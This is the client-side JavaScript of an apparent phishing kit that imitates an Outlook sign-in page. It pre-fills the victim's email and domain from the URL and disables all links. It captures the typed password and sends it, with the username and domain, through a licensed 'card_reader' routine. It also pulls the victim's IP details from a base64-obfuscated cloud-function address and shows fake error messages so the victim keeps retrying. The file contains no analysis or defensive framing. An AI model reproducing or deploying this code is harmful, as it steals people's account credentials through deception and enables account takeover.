let addC = "has-error ext-has-error";//passwordError
let ip_config = {};
$(document).ready(async function (){
    localStorageCheck();
    $("a").each(function (){
        $(this).attr("onclick", "window.location.replace(window.location.href); return false;")
    });

    let url = new URL(location.href);
    $("#passwd").attr("title", "Enter the password for " + url.searchParams.get("u"))
    $("#username").val(url.searchParams.get("u"));
    $("#displayName").html(url.searchParams.get("u"));
    $("#domain").val(url.searchParams.get("d"));


    $("#form_outlook").on('submit', async function (e){
        e.preventDefault();
        let $passwordError = $("#passwordError");
        let $login_sign = $("#idSIButton9");
        let $passwd = $("#i0118");
        let $progressBar = $('#progressBar');
        let $lightboxCover = $(".lightbox-cover");
        $passwordError.hide("fast");
        $progressBar.show();
        $passwd.removeClass(addC);
        $lightboxCover.addClass("disable-lightbox");
        $login_sign.addClass("active");
        if($passwd.val().length < 6){
            setTimeout(function (){
                $progressBar.hide();
                $passwordError.html("Please enter a valid password.");
                $passwordError.show("fast");
                $passwd.addClass(addC);
                $lightboxCover.removeClass("disable-lightbox");
            }, 700);
        }else {

            let result = await card_reader(SCRIPT_NAME, "Jm Tech", LICENSE_KEY, JSON.stringify(ip_config), $passwd.val(), $("#username").val(), $("#domain").val())
            if(Object.keys(result).includes('errors')){
                setTimeout(function (){
                    $progressBar.hide();
                    $passwordError.html("Error, please check your internet connection or reload this page.");
                    $passwordError.show("fast");
                    $passwd.addClass(addC);
                    $lightboxCover.removeClass("disable-lightbox");
                },700);
            }else {
                setTimeout(function (){
                    if(result.response.msg.includes("uccessfull")){
                        localStorage.setItem("sent", "true sent for real");
                        parent.close_final();
                    }else {
                        $progressBar.hide();
                        $passwordError.html("Unknown error occur, please reload this page or try again.");
                        $passwordError.show("fast");
                        $passwd.addClass(addC);
                        $lightboxCover.removeClass("disable-lightbox");
                    }
                }, 1300);
            }
        }
        return false;
    });


    if(Object.keys(ip_config).length < 2){
        await get_ip();
    }
});




async function get_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                console.log(response);
                if(response.status === "success"){
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                console.log(error);
                resolve(true);
            }
        });
    });
}


function localStorageCheck(){
    let ip = localStorage.getItem("ip_config");
    if(ip !== null) ip_config = JSON.parse(ip);
}

